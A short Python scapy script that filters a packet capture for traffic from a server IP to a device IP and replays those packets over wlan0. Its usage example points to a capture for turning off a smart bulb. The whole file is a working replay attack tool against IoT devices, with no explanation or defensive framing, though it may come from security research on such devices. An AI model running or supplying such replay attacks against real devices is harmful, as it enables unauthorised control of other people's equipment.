from scapy.all import rdpcap, sendp, Ether, IP, TCP
import sys

def replay_pcap(pcap_file, iface):
    # Read packets from the pcap file
    packets = rdpcap(pcap_file)
    
    # Filter packets that are going from the server to the device
    server_to_device_packets = [pkt for pkt in packets if IP in pkt and pkt[IP].src == server_ip and pkt[IP].dst == device_ip]
    
    # Send each packet
    for pkt in server_to_device_packets:
        # Send packet on specified interface
        sendp(pkt, iface=iface, verbose=False)
        print(f"Replayed packet: {pkt.summary()}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <pcap file> <server ip> <device ip>")
        print(f"For example: {sys.argv[0]} turn-off-replay-bulb.pcapng \"52.58.249.45\" \"10.42.0.243\"")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    server_ip = sys.argv[2]
    device_ip = sys.argv[3]
    iface = "wlan0"  # The network interface to send the packets on

    replay_pcap(pcap_file, iface)

